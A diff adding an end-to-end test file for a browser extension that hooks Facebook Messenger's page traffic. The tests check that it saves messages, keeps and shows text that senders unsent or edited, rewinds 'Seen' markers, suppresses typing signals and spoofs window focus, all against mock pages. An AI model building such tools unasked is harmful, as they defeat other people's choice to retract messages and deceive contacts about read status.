@@ -1,0 +1,838 @@
+'use strict';
+// End-to-end test: loads the real extension into Chromium, serves a test double of the
+// Messenger page on https://www.facebook.com/ and a fake gateway WebSocket, then checks
+// saving, unsend recovery, edits, photos, Unseen and the dashboard.
+//
+// Run: node --test tests/e2e/
+
+const test = require('node:test');
+const assert = require('node:assert/strict');
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const { chromium } = require('playwright');
+const h = require('../unit/helpers.js');
+const mw = require('../../extension/content/main-world.js');
+
+const EXT = path.resolve(__dirname, '../../extension');
+const FIXTURE = fs.readFileSync(path.resolve(__dirname, '../fixtures/mock-messenger.html'), 'utf8');
+const THREAD = '100012345678901';
+const ME = '100099999999999';
+const PNG_1x1 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
+const dec = new TextDecoder();
+// Shape of a reel page's data (RelayPrefetchedStreamCache -> creation_story -> playback_video), test values only
+const REEL_DATA = {
+  require: [['ScheduledServerJS', 'handle', null, [{ __bbox: { require: [['RelayPrefetchedStreamCache', 'next', [], ['adp_FBReelsRootWithEntrypointQueryRelayPreloader_1', { __bbox: { complete: true, result: { data: { video: { creation_story: { short_form_video_context: { playback_video: { __typename: 'Video', id: '987654321', videoDeliveryLegacyFields: { browser_native_hd_url: 'https://video-x.xx.fbcdn.net/v/t42/reelhd.mp4?_nc=1&oh=9', browser_native_sd_url: 'https://video-x.xx.fbcdn.net/v/t42/reelsd.mp4?_nc=1&oh=9' } } } } } } } } }]]] } }]]],
+};
+const REEL_HTML = `<!doctype html><html><head><title>Reel</title></head><body><script type="application/json" data-content-len="999" data-sjs>${JSON.stringify(REEL_DATA).replace(/\//g, '\\/')}</script></body></html>`;
+
+async function waitFor(fn, { timeout = 10000, interval = 150, what = 'condition' } = {}) {
+  const end = Date.now() + timeout;
+  let last;
+  while (Date.now() < end) {
+    try {
+      last = await fn();
+      if (last) return last;
+    } catch (e) {
+      last = e;
+    }
+    await new Promise((r) => setTimeout(r, interval));
+  }
+  throw new Error('Timed out waiting for ' + what + (last instanceof Error ? ': ' + last.message : ''));
+}
+
+test('Messenger Message Saver end to end', { timeout: 240000 }, async (t) => {
+  const userDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mms-e2e-'));
+  const ctx = await chromium.launchPersistentContext(userDir, {
+    channel: 'chromium',
+    headless: true,
+    viewport: { width: 1280, height: 860 },
+    args: [`--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`],
+  });
+  const errors = [];
+  t.after(async () => {
+    await ctx.close();
+    fs.rmSync(userDir, { recursive: true, force: true });
+  });
+
+  let [sw] = ctx.serviceWorkers();
+  if (!sw) sw = await ctx.waitForEvent('serviceworker', { timeout: 20000 });
+  const extId = sw.url().split('/')[2];
+
+  // fake facebook.com (GraphQL answers with whatever the current test put in graphqlReply)
+  let graphqlReply = '{}';
+  await ctx.route('https://www.facebook.com/**', (route) => {
+    // a reel's own page, as the downloader reads it (data in a <script type="application/json">, slashes escaped)
+    if (route.request().url().includes('/reel/987654321')) return route.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: REEL_HTML });
+    if (route.request().resourceType() === 'document') return route.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: FIXTURE });
+    if (route.request().url().includes('/api/graphql/')) return route.fulfill({ status: 200, contentType: 'text/javascript; charset=utf-8', body: 'for (;;);' + graphqlReply });
+    return route.fulfill({ status: 204, body: '' });
+  });
+  // pictures the test page shows from Facebook's image servers
+  await ctx.route(/^https:\/\/[^/]*fbcdn\.net\//, (route) =>
+    route.request().resourceType() === 'image' ? route.fulfill({ status: 200, contentType: 'image/png', body: Buffer.from(PNG_1x1, 'base64') }) : route.fulfill({ status: 404, body: '' })
+  );
+  await ctx.grantPermissions(['notifications'], { origin: 'https://www.facebook.com' });
+
+  // fake gateway.facebook.com
+  const gw = { socket: null, fromPage: [] };
+  await ctx.routeWebSocket(/^wss:\/\/gateway\.facebook\.com\//, (ws) => {
+    gw.socket = ws;
+    ws.onMessage((msg) => gw.fromPage.push(typeof msg === 'string' ? Buffer.from(msg) : msg));
+  });
+
+  // extension page used to read the extension's own database
+  const dash = await ctx.newPage();
+  dash.on('pageerror', (e) => errors.push('dashboard: ' + e.message));
+  await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#unsent`);
+  const dbAll = (store) => dash.evaluate(async (s) => (await import('/lib/db.js')).getAll(s), store);
+  const setSettings = (patch) =>
+    dash.evaluate(async (p) => {
+      const { getSettings } = await import('/lib/settings.js');
+      const cur = await getSettings();
+      await chrome.storage.local.set({ settings: { ...cur, ...p } });
+    }, patch);
+
+  const page = await ctx.newPage();
+  page.on('pageerror', (e) => errors.push('page: ' + e.message));
+  await page.goto('https://www.facebook.com/');
+  await page.context().addCookies([{ name: 'c_user', value: ME, domain: '.facebook.com', path: '/', secure: true }]);
+
+  await t.test('page hook is installed before the page runs', async () => {
+    assert.equal(await page.evaluate(() => window.__mmsInstalled === true), true);
+    assert.equal(await page.evaluate(() => typeof window.fb), 'object');
+  });
+
+  await t.test('Strong mode: the news feed keeps real focus; Messenger pages report "no focus"', async () => {
+    const focusEventsReach = () =>
+      page.evaluate(() => {
+        let n = 0;
+        const f = () => n++;
+        window.addEventListener('focus', f);
+        window.dispatchEvent(new Event('focus'));
+        window.removeEventListener('focus', f);
+        return n;
+      });
+    await page.bringToFront();
+    // feed (/): Facebook must see the real focus, or its feed, Watch and Reels stop loading
+    await page.evaluate(() => fb.focusInfo()); // settings have arrived by now or shortly
+    await new Promise((r) => setTimeout(r, 500));
+    assert.equal((await page.evaluate(() => fb.focusInfo())).hasFocus, true, 'real focus on the feed');
+    assert.equal(await focusEventsReach(), 1, 'focus events reach the feed');
+
+    // into Messenger without a reload (Facebook is a single-page app): Facebook is told the window lost focus
+    const entered = await page.evaluate((thread) => {
+      window.__mmsBlurs = 0;
+      window.__mmsFocuses = 0;
+      window.addEventListener('blur', () => window.__mmsBlurs++);
+      window.addEventListener('focus', () => window.__mmsFocuses++);
+      history.pushState({}, '', '/messages/t/' + thread + '/');
+      return { hasFocus: document.hasFocus(), blurs: window.__mmsBlurs };
+    }, THREAD);
+    assert.deepEqual(entered, { hasFocus: false, blurs: 1 }, 'switch happens during the navigation itself');
+    const info = await page.evaluate(() => fb.focusInfo());
+    assert.equal(info.visibilityState, 'visible', 'visibility is real by default (Facebook needs it)');
+    assert.equal(await focusEventsReach(), 0, 'window focus events held back on Messenger pages');
+    // visibilitychange always reaches the page
+    assert.equal(await page.evaluate(() => { let n = 0; document.addEventListener('visibilitychange', () => n++); document.dispatchEvent(new Event('visibilitychange')); return n; }), 1);
+
+    await setSettings({ stealthVisibility: true });
+    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).visibilityState === 'hidden', { what: 'optional hidden mode' });
+    await setSettings({ stealthVisibility: false, stealthFocus: false });
+    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).visibilityState === 'visible', { what: 'visible again' });
+    assert.equal(await focusEventsReach(), 1, 'focus events pass when Strong mode is off');
+    assert.equal((await page.evaluate(() => fb.focusInfo())).hasFocus, true, 'real focus when Strong mode is off');
+    await setSettings({ stealthFocus: true });
+    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).hasFocus === false, { what: 'no focus again' });
+
+    // Back/Forward and links out of Messenger: the feed gets its focus back at once
+    const left = await page.evaluate(() => {
+      const before = window.__mmsFocuses;
+      history.pushState({}, '', '/');
+      return { hasFocus: document.hasFocus(), focuses: window.__mmsFocuses - before };
+    });
+    assert.deepEqual(left, { hasFocus: true, focuses: 1 }, 'focus handed back on leaving Messenger');
+    assert.equal(await focusEventsReach(), 1);
+    await page.goBack(); // popstate back to /messages/t/...
+    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).hasFocus === false, { what: 'Back into Messenger' });
+    await page.evaluate(() => history.pushState({}, '', '/'));
+    assert.equal((await page.evaluate(() => fb.focusInfo())).hasFocus, true);
+
+    // A Messenger tab open before an install/update gets the hook late, after Facebook read the
+    // real focus: the hook tells it once that the window is not focused.
+    const late = await ctx.newPage();
+    await late.route('https://late.example/**', (route) =>
+      route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>late</title><script>window.__blurs = 0; addEventListener("blur", () => window.__blurs++);</script>' })
+    );
+    await late.goto('https://late.example/messages/t/123456789/');
+    await late.bringToFront();
+    assert.equal(await late.evaluate(() => document.hasFocus()), true);
+    await late.addScriptTag({ path: path.join(EXT, 'content/main-world.js') });
+    assert.deepEqual(await late.evaluate(() => ({ blurs: window.__blurs, hasFocus: document.hasFocus() })), { blurs: 1, hasFocus: false });
+    await late.close();
+    await page.bringToFront();
+  });
+
+  await t.test('network: message saved, then kept after the sender unsends it', async () => {
+    await page.evaluate(() => fb.connect());
+    await waitFor(() => gw.socket, { what: 'gateway connection' });
+    const steps = [
+      h.call('verifyContactRowExists', { 0: h.i64(THREAD), 2: '', 3: 'Khondoker Aurthe' }, 22),
+      h.call('deleteThenInsertThread', { 0: h.i64(1731571860000), 1: h.i64(1731571000000), 2: 'hi', 3: '', 7: h.i64(THREAD), 9: h.i64(1) }, 50),
+      h.insertMessage({ text: 'network secret', threadKey: THREAD, ts: 1731571860000, id: 'mid.$net1', senderId: THREAD }),
+    ];
+    gw.socket.send(Buffer.from(h.dgwData(3, h.responseEnvelope(steps))));
+    const saved = await waitFor(async () => (await dbAll('messages')).find((m) => m.key === 'fb:mid.$net1'), { what: 'network message saved' });
+    assert.equal(saved.text, 'network secret');
+    assert.equal(saved.isMine, false);
+
+    gw.socket.send(Buffer.from(h.dgwData(3, h.responseEnvelope([h.insertMessage({ text: '', threadKey: THREAD, ts: 1731571860000, id: 'mid.$net1', senderId: THREAD, unsent: true, proc: 'deleteThenInsertMessage' })]))));
+    const after = await waitFor(async () => (await dbAll('messages')).find((m) => m.key === 'fb:mid.$net1' && m.unsent), { what: 'unsent flag' });
+    assert.equal(after.text, 'network secret', 'original text kept');
+    const contacts = await dbAll('contacts');
+    assert.ok(contacts.some((c) => c.id === THREAD && c.name === 'Khondoker Aurthe'));
+    const notes = await sw.evaluate(() => new Promise((r) => chrome.notifications.getAll(r)));
+    assert.ok(Object.keys(notes).some((k) => k.startsWith('mms|')), 'desktop alert shown for the unsend');
+  });
+
+  await t.test('GraphQL: Messenger queries are read, news-feed queries are ignored', async () => {
+    const lsDoc = (text, id) => JSON.stringify({ data: { viewer: { lightspeed_web_request: { payload: h.lsPayload([h.insertMessage({ text, threadKey: THREAD, ts: 1731571865000, id, senderId: THREAD })]), dependencies: [] } } } });
+    graphqlReply = lsDoc('from graphql', 'mid.$gql1');
+    await page.evaluate(() => fetch('/api/graphql/', { method: 'POST', body: new URLSearchParams({ fb_api_req_friendly_name: 'LSPlatformGraphQLLightspeedRequestQuery', variables: '{}' }) }).then((r) => r.text()));
+    await waitFor(async () => (await dbAll('messages')).find((m) => m.key === 'fb:mid.$gql1' && m.text === 'from graphql'), { what: 'GraphQL message saved' });
+    graphqlReply = lsDoc('feed noise', 'mid.$feed1');
+    await page.evaluate(() => fetch('/api/graphql/', { method: 'POST', body: new URLSearchParams({ fb_api_req_friendly_name: 'CometNewsFeedPaginationQuery', variables: '{}' }) }).then((r) => r.text()));
+    await page.evaluate(() => new Promise((resolve) => {
+      const x = new XMLHttpRequest();
+      x.open('POST', '/api/graphql/');
+      x.onload = resolve;
+      x.send('fb_api_req_friendly_name=CometNewsFeedPaginationQuery');
+    }));
+    // Facebook's long random request fields can contain a word like "thread" or "MAW" by chance
+    await page.evaluate(() => fetch('/api/graphql/', { method: 'POST', body: '__dyn=7AzHxqU5a5Q1ryaxG4VuC0BVU98nwgU29zEdEc8co5S3O2Saw8i2S1DwUx60xU8E3Qwb-q7oc81EEbbwto88422y11xmfz83WwgEcEhwnU1e42C2203xMAW1xthread0&__csr=g4thread&fb_api_req_friendly_name=CometNewsFeedPaginationQuery&variables=%7B%7D' }).then((r) => r.text()));
+    await new Promise((r) => setTimeout(r, 800));
+    assert.equal((await dbAll('messages')).some((m) => m.key === 'fb:mid.$feed1'), false, 'feed requests are not read');
+    // a string body is recognised by its query name too
+    graphqlReply = lsDoc('string body', 'mid.$gql2');
+    await page.evaluate(() => fetch('/api/graphql/', { method: 'POST', body: 'av=1&__dyn=abc&fb_api_req_friendly_name=LSPlatformGraphQLLightspeedRequestQuery&variables=%7B%7D' }).then((r) => r.text()));
+    await waitFor(async () => (await dbAll('messages')).find((m) => m.key === 'fb:mid.$gql2'), { what: 'string-body Messenger query read' });
+  });
+
+  await t.test('Unseen: "Seen" is rewound and "typing" is cleared before leaving the browser', async () => {
+    const sendTask = `{"thread_id":${THREAD},"otid":"7123456789012345678","source":65537,"send_type":1,"sync_group":1,"text":"hi","initiating_source":1}`;
+    const readTask = `{"thread_id":${THREAD},"last_read_watermark_ts":1731571860000,"sync_group":1}`;
+    const req = h.taskRequest([
+      { label: '46', payload: sendTask, queue: THREAD, taskId: 3 },
+      { label: '21', payload: readTask, queue: THREAD, taskId: 4 },
+    ]);
+    const before = gw.fromPage.length;
+    await page.evaluate((json) => fb.sendJson(json), req);
+    const got = await waitFor(() => gw.fromPage.length > before && gw.fromPage[gw.fromPage.length - 1], { what: 'frame at server' });
+    const frames = mw.dgwParse(new Uint8Array(got));
+    assert.equal(frames.length, 2);
+    const env = JSON.parse(dec.decode(frames[1].payload));
+    const inner = JSON.parse(env.payload);
+    assert.equal(inner.tasks.length, 2, 'no task dropped');
+    assert.equal(JSON.parse(inner.tasks[0].payload).text, 'hi', 'message send untouched');
+    assert.equal(JSON.parse(inner.tasks[1].payload).last_read_watermark_ts, 1731571000000, 'read marker rewound to what the server already had');
+    assert.ok(dec.decode(frames[1].payload).includes('7300123456789012345'), '64-bit ids unchanged');
+
+    const before2 = gw.fromPage.length;
+    await page.evaluate((json) => fb.sendJson(json, false), h.typingRequest({ threadKey: THREAD, typing: 1 }));
+    const got2 = await waitFor(() => gw.fromPage.length > before2 && gw.fromPage[gw.fromPage.length - 1], { what: 'typing frame' });
+    const env2 = JSON.parse(dec.decode(mw.dgwParse(new Uint8Array(got2))[1].payload));
+    assert.equal(JSON.parse(JSON.parse(env2.payload).payload).is_typing, 0);
+
+    await setSettings({ blockSeen: false, blockTyping: false });
+    await new Promise((r) => setTimeout(r, 400));
+    const before3 = gw.fromPage.length;
+    await page.evaluate((json) => fb.sendJson(json), req);
+    const got3 = await waitFor(() => gw.fromPage.length > before3 && gw.fromPage[gw.fromPage.length - 1], { what: 'frame with unseen off' });
+    const inner3 = JSON.parse(JSON.parse(dec.decode(mw.dgwParse(new Uint8Array(got3))[1].payload)).payload);
+    assert.equal(JSON.parse(inner3.tasks[1].payload).last_read_watermark_ts, 1731571860000, 'untouched when Unseen is off');
+    await setSettings({ blockSeen: true, blockTyping: true });
+    await new Promise((r) => setTimeout(r, 400));
+    // a later read with Unseen back on is held at what the server now has (never lower)
+    const readLater = `{"thread_id":${THREAD},"last_read_watermark_ts":1731571990000,"sync_group":1}`;
+    const before4 = gw.fromPage.length;
+    await page.evaluate((json) => fb.sendJson(json), h.taskRequest([{ label: '21', payload: readLater, queue: THREAD, taskId: 5 }]));
+    const got4 = await waitFor(() => gw.fromPage.length > before4 && gw.fromPage[gw.fromPage.length - 1], { what: 'frame after Unseen back on' });
+    const inner4 = JSON.parse(JSON.parse(dec.decode(mw.dgwParse(new Uint8Array(got4))[1].payload)).payload);
+    assert.equal(JSON.parse(inner4.tasks[0].payload).last_read_watermark_ts, 1731571860000, 'rewound to the marker this tab sent, not below it');
+  });
+
+  await t.test('screen: incoming and own messages are saved with sender and direction', async () => {
+    await page.evaluate(() => {
+      fb.dateBreak('Today');
+      fb.addMessage({ domId: '100012345678901@msgr.7001', sender: 'Khondoker Aurthe', time: '3:11 PM', text: 'screen secret' });
+      fb.addMessage({ domId: '100099999999999@msgr.7002', sender: 'You', time: '3:12 PM', text: 'Good afternoon', mine: true });
+    });
+    const rec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100012345678901@msgr.7001'), { what: 'screen message saved' });
+    assert.equal(rec.text, 'screen secret');
+    assert.equal(rec.senderName, 'Khondoker Aurthe');
+    assert.equal(rec.isMine, false);
+    assert.ok(rec.ts > 0);
+    const mine = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100099999999999@msgr.7002'), { what: 'own message saved' });
+    assert.equal(mine.isMine, true);
+    // Messenger puts the same number before "@msgr" on everyone's messages: it must not decide direction
+    await page.evaluate(() => fb.addMessage({ domId: '100099999999999@msgr.7005', sender: 'Khondoker Aurthe', time: '3:13 PM', text: 'same prefix, still incoming' }));
+    const incoming = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100099999999999@msgr.7005'), { what: 'prefixed incoming saved' });
+    assert.equal(incoming.isMine, false);
+    assert.equal(incoming.senderName, 'Khondoker Aurthe');
+  });
+
+  await t.test('the same message seen on the network and on screen is stored once', async () => {
+    gw.socket.send(Buffer.from(h.dgwData(3, h.responseEnvelope([h.insertMessage({ text: 'dedupe me', threadKey: THREAD, ts: 1731571870000, id: 'mid.$dup1', senderId: THREAD })]))));
+    await waitFor(async () => (await dbAll('messages')).find((m) => m.key === 'fb:mid.$dup1'), { what: 'network copy' });
+    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000007777', sender: 'Khondoker Aurthe', time: '3:12 PM', text: 'dedupe me' }));
+    const merged = await waitFor(async () => (await dbAll('messages')).find((m) => m.key === 'fb:mid.$dup1' && m.domId === 'msgr.7460000000000007777'), { what: 'screen copy merged into network record' });
+    assert.deepEqual(merged.sources.sort(), ['network', 'screen']);
+    assert.equal((await dbAll('messages')).filter((m) => m.text === 'dedupe me').length, 1);
+    const threads = await dbAll('threads');
+    const popupThread = threads.find((t) => t.threadKey === THREAD);
+    assert.equal(popupThread && popupThread.domName, 'Khondoker Aurthe', 'pop-up keyed by the profile id and named from its header');
+  });
+
+  await t.test('screen: live unsend shows the original under "unsent a message"', async () => {
+    await page.evaluate(() => fb.unsend('100012345678901@msgr.7001', 'Khondoker Aurthe unsent a message'));
+    const box = await waitFor(async () => {
+      const txt = await page.evaluate(() => {
+        const b = document.querySelector('[data-message-id="100012345678901@msgr.7001"] .mms-recovered');
+        return b && b.textContent;
+      });
+      return txt && txt.includes('screen secret') ? txt : null;
+    }, { what: 'recovered box' });
+    assert.match(box, /Saved copy/);
+    const rec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100012345678901@msgr.7001' && m.unsent), { what: 'unsent flag in db' });
+    assert.equal(rec.text, 'screen secret');
+  });
+
+  await t.test('screen: edits keep the earlier text and show it in the chat', async () => {
+    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7003', sender: 'Khondoker Aurthe', time: '3:14 PM', text: 'original words' }));
+    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100012345678901@msgr.7003'), { what: 'message before edit' });
+    await page.evaluate(() => fb.edit('100012345678901@msgr.7003', 'changed words'));
+    const rec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100012345678901@msgr.7003' && m.edited), { what: 'edit saved' });
+    assert.equal(rec.text, 'changed words');
+    assert.equal(rec.history[0].text, 'original words');
+    await waitFor(async () => page.evaluate(() => {
+      const b = document.querySelector('[data-message-id="100012345678901@msgr.7003"] .mms-edit-history');
+      return b && b.textContent.includes('original words');
+    }), { what: 'edit history box' });
+  });
+
+  await t.test('screen: photos are saved and shown again after an unsend', async () => {
+    await page.evaluate((png) => fb.addMessage({ domId: '100012345678901@msgr.7004', sender: 'Khondoker Aurthe', time: '3:15 PM', text: '', photo: 'data:image/png;base64,' + png }), PNG_1x1);
+    const rec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === '100012345678901@msgr.7004' && m.attachments.some((a) => a.mediaKey)), { what: 'photo stored' });
+    assert.ok(rec.attachments.length >= 1);
+    const media = await dbAll('media');
+    assert.ok(media.some((x) => x.key === rec.attachments[0].mediaKey && x.size > 0));
+    await page.evaluate(() => fb.unsend('100012345678901@msgr.7004', 'Khondoker Aurthe unsent a message'));
+    await waitFor(async () => page.evaluate(() => !!document.querySelector('[data-message-id="100012345678901@msgr.7004"] .mms-recovered img')), { what: 'recovered photo' });
+  });
+
+  await t.test('encrypted chats: unsent row gets a NEW id - still matched, live and after reload', async () => {
+    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000008001', sender: 'Khondoker Aurthe', time: '3:16 PM', text: 'id will change' }));
+    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000008001'), { what: 'saved under canonical id' });
+    await page.evaluate(() => fb.unsendInPlace('100012345678901@msgr.7460000000000008001', '100012345678901@msgr.7460000000000009999', 'Khondoker Aurthe deleted a message'));
+    await waitFor(async () => page.evaluate(() => {
+      const b = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000009999"] .mms-recovered');
+      return b && b.textContent.includes('id will change');
+    }), { what: 'live recovery despite id change' });
+    const alias = await waitFor(async () => (await dbAll('aliases')).find((a) => a.domId === 'msgr.7460000000000009999'), { what: 'alias stored' });
+    assert.ok(alias.messageKey);
+    const rec = (await dbAll('messages')).find((m) => m.key === alias.messageKey);
+    assert.equal(rec.unsent, true);
+    assert.equal(rec.text, 'id will change');
+  });
+
+  await t.test('stickers, blob photos and the "Edited" button are understood', async () => {
+    await page.evaluate((png) => {
+      fb.addMessage({ domId: '100012345678901@msgr.7460000000000008101', sender: 'Khondoker Aurthe', time: '3:17 PM', text: '', photo: fb.blobPng(png) });
+      fb.addMessage({ domId: '100012345678901@msgr.7460000000000008102', sender: 'Khondoker Aurthe', time: '3:17 PM', text: '', sticker: 'data:image/png;base64,' + png });
+    }, PNG_1x1);
+    const blobRec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000008101' && m.attachments.some((a) => a.mediaKey)), { what: 'blob photo stored' });
+    assert.ok(blobRec);
+    const stickerRec = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000008102' && m.attachments.length), { what: 'sticker saved' });
+    assert.ok(stickerRec.attachments[0]);
+    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000008103', sender: 'Khondoker Aurthe', time: '3:18 PM', text: 'before button edit' }));
+    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000008103'), { what: 'pre-edit saved' });
+    await page.evaluate(() => fb.edit('100012345678901@msgr.7460000000000008103', 'after button edit', true));
+    await waitFor(async () => page.evaluate(() => {
+      const b = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000008103"] .mms-edit-history');
+      return b && b.textContent.includes('before button edit');
+    }), { what: 'edit history via Edited button' });
+  });
+
+  await t.test('other UI languages: the unsent wording is learned from the page', async () => {
+    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000008201', sender: 'Khondoker Aurthe', time: '3:19 PM', text: 'learn me' }));
+    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000008201'), { what: 'saved before unsend' });
+    // a wording no built-in pattern knows
+    await page.evaluate(() => fb.unsendInPlace('100012345678901@msgr.7460000000000008201', '100012345678901@msgr.7460000000000008201', 'Khondoker Aurthe zz-unsendword-zz'));
+    await waitFor(async () => page.evaluate(() => {
+      const b = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000008201"] .mms-recovered');
+      return b && b.textContent.includes('learn me');
+    }), { what: 'structural unsend detection' });
+    const learned = await dash.evaluate(async () => (await chrome.storage.local.get('learnedPlaceholders')).learnedPlaceholders || []);
+    assert.ok(learned.some((src) => src.includes('zz-unsendword-zz')), 'pattern learned: ' + JSON.stringify(learned));
+  });
+
+  await t.test('after a reload, old placeholders are filled from the saved copy', async () => {
+    await page.evaluate(() =>
+      fb.addMessage({ domId: '100012345678901@msgr.7101', sender: 'Khondoker Aurthe', time: '3:20 PM', text: 'alpha one' }) ||
+      fb.addMessage({ domId: '100012345678901@msgr.7102', sender: 'Khondoker Aurthe', time: '3:20 PM', text: 'beta two' }) ||
+      fb.addMessage({ domId: '100012345678901@msgr.7103', sender: 'Khondoker Aurthe', time: '3:21 PM', text: 'gamma three' })
+    );
+    await waitFor(async () => (await dbAll('messages')).some((m) => m.text === 'gamma three'), { what: 'context rows saved' });
+    await page.reload();
+    await page.evaluate(() => {
+      fb.addMessage({ domId: '100012345678901@msgr.7001', sender: 'Khondoker Aurthe', time: '3:11 PM', placeholder: 'Khondoker Aurthe unsent a message' });
+      fb.addMessage({ domId: '100012345678901@msgr.7101', sender: 'Khondoker Aurthe', time: '3:20 PM', text: 'alpha one' });
+      // same position, but Messenger gave the placeholder a different id: matched by its neighbours
+      fb.addMessage({ domId: '100012345678901@msgr.9999', sender: 'Khondoker Aurthe', time: '3:20 PM', placeholder: 'Khondoker Aurthe unsent a message' });
+      fb.addMessage({ domId: '100012345678901@msgr.7103', sender: 'Khondoker Aurthe', time: '3:21 PM', text: 'gamma three' });
+      fb.addMessage({ domId: '100012345678901@msgr.7460000000000009999', sender: 'Khondoker Aurthe', time: '3:16 PM', placeholder: 'Khondoker Aurthe deleted a message' });
+      fb.addMessage({ domId: '100012345678901@msgr.7460000000000008201', sender: 'Khondoker Aurthe', time: '3:19 PM', placeholder: 'Khondoker Aurthe zz-unsendword-zz' });
+    });
+    await waitFor(async () => page.evaluate(() => {
+      const b = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000009999"] .mms-recovered');
+      return b && b.textContent.includes('id will change');
+    }), { what: 'recovery through the stored id alias' });
+    await waitFor(async () => page.evaluate(() => {
+      const b = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000008201"] .mms-recovered');
+      return b && b.textContent.includes('learn me');
+    }), { what: 'learned wording recognised after reload' });
+    await waitFor(async () => page.evaluate(() => {
+      const b = document.querySelector('[data-message-id="100012345678901@msgr.7001"] .mms-recovered');
+      return b && b.textContent.includes('screen secret');
+    }), { what: 'exact match by message id' });
+    await waitFor(async () => page.evaluate(() => {
+      const b = document.querySelector('[data-message-id="100012345678901@msgr.9999"] .mms-recovered');
+      return b && b.textContent.includes('beta two');
+    }), { what: 'match by neighbouring messages' });
+  });
+
+  await t.test('review fixes: no wrong matches, no chat mix-ups, typed text, reply photos, likes', async () => {
+    // other UI language: list label translated, generic heading "Tin nhắn" above every log
+    await page.evaluate(() => {
+      fb.openPopup({ logId: 'log-bob', title: 'Bob Smith', profileId: '200000000000001', label: 'Tin nhắn trong cuộc trò chuyện với Bob Smith', generic: 'Tin nhắn' });
+      fb.openPopup({ logId: 'log-carol', title: 'Carol Jones', profileId: '300000000000001', label: 'Tin nhắn trong cuộc trò chuyện với Carol Jones', generic: 'Tin nhắn' });
+      fb.inLog('log-bob', (f) => f.addMessage({ domId: '200000000000001@msgr.7460000000000006001', sender: 'Bob Smith', time: '9:00 AM', text: 'my bank PIN is 4321' }));
+    });
+    const bob = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000006001'), { what: 'Bob message saved' });
+    assert.equal(bob.threadKey, '200000000000001', 'Bob pop-up keyed by his profile id, not by the generic heading');
+    await page.evaluate(() => fb.inLog('log-bob', (f) => f.unsendInPlace('200000000000001@msgr.7460000000000006001', '200000000000001@msgr.7460000000000006001', 'Bob Smith deleted a message')));
+    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000006001' && m.unsent), { what: 'Bob unsend saved' });
+    // Carol's chat: an uncaptured placeholder must not show Bob's (or anyone's) message
+    await page.evaluate(() => fb.inLog('log-carol', (f) => f.addMessage({ domId: '300000000000001@msgr.7460000000000006101', sender: 'Carol Jones', time: '11:05 AM', placeholder: 'Carol Jones deleted a message' })));
+    const carolBox = await waitFor(async () => page.evaluate(() => {
+      const b = document.querySelector('[data-message-id="300000000000001@msgr.7460000000000006101"] .mms-recovered');
+      return b && b.textContent;
+    }), { what: 'Carol placeholder box' });
+    assert.match(carolBox, /No saved copy/);
+    assert.ok(!carolBox.includes('4321'));
+    const names = (await dbAll('threads')).map((t) => t.domName);
+    assert.ok(!names.includes('Tin nhắn'), 'generic heading never used as a chat name');
+
+    // same chat, same sender, but an older unsent message at another time: not offered as the original
+    await page.evaluate(() => fb.inLog('log-bob', (f) => f.addMessage({ domId: '200000000000001@msgr.7460000000000006002', sender: 'Bob Smith', time: '11:05 AM', placeholder: 'Bob Smith deleted a message' })));
+    const otherBox = await waitFor(async () => page.evaluate(() => {
+      const b = document.querySelector('[data-message-id="200000000000001@msgr.7460000000000006002"] .mms-recovered');
+      return b && b.textContent;
+    }), { what: 'second Bob placeholder box' });
+    assert.match(otherBox, /No saved copy/);
+
+    // a typed sentence that looks like a placeholder is a normal message
+    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000006201', sender: 'Khondoker Aurthe', time: '3:30 PM', text: 'wait, Alice deleted a message' }));
+    await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000006201' && m.text === 'wait, Alice deleted a message'), { what: 'typed look-alike saved' });
+    assert.equal(await page.evaluate(() => !!document.querySelector('[data-message-id="100012345678901@msgr.7460000000000006201"] .mms-recovered')), false);
+
+    // the photo in a reply's quote belongs to the quoted message
+    await page.evaluate((png) => fb.addMessage({ domId: '100012345678901@msgr.7460000000000006301', sender: 'Khondoker Aurthe', time: '3:31 PM', text: 'reply with quote', quotePhoto: 'data:image/png;base64,' + png }), PNG_1x1);
+    const reply = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000006301'), { what: 'reply saved' });
